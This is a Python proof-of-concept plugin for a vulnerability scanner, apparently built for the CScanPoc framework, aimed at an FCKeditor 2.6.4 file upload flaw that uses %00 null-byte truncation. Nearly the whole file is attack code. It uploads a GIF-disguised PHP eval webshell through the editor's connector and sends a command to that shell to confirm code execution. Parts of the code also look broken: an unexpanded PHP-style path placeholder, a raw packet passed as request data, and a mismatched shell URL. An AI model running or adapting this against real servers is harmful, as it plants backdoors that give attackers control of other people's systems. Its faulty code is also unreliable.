# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re
import hashlib


class Vuln(ABVuln):
    vuln_id = 'FCKeditor_0000'  # 平台漏洞编号，留空
    name = 'FCKeditor 2.6.4 %00截断任意文件上传漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_UPLOAD  # 漏洞类型
    disclosure_date = '2012-04-19'  # 漏洞公布时间
    desc = '''
        FCKeditorr 2.6 版本有一个文件上传漏洞.
    '''  # 漏洞描述
    ref = 'http://www.webshell.cc/3459.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'FCKeditor'  # 漏洞应用名称
    product_version = '2.6.4'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'd647e4e2-3a96-4d09-bf88-695895fa7814'
    author = '国光'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url = '{target}'.format(target=self.target)
            filename = "ice.gif"
            foldername = "ice.php%00.gif"
            connector = "editor/filemanager/connectors/php/connector.php"
            proto, rest = urllib.parse.splittype(url)
            host, rest = urllib.parse.splithost(rest)
            payload = "-----------------------------265001916915724\r\n"
            payload += "Content-Disposition: form-data; name=\"NewFile\"; filename=\"ice.gif\"\r\n"
            payload += "Content-Type: image/jpeg\r\n\r\n"
            payload += 'GIF89a'+"\r\n"+'<?php eval($_POST[ice]) ?>'+"\n"
            payload += "-----------------------------265001916915724--\r\n"
            packet = "POST {$path}{$connector}?Command=FileUpload&Type=Image&CurrentFolder=" + \
                foldername+" HTTP/1.0\r\n"
            packet += "Host: " + host + "\r\n"
            packet += "Content-Type: multipart/form-data; boundary=---------------------------265001916915724\r\n"
            packet += "Content-Length: " + str(len(payload))+"\r\n"
            packet += "Connection: close\r\n\r\n"
            packet += payload

            webshell_url = url + '/uploadfile/file/ice.php'
            urllib.request.urlopen(url, data=packet)
            request = urllib.request.Request(
                webshell_url, data="e=echo strrev(gwesdvjvncqwdijqiwdqwduhq);")
            response = str(urllib.request.urlopen(request).read())

            if 'gwesdvjvncqwdijqiwdqwduhq'[::-1] in response:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
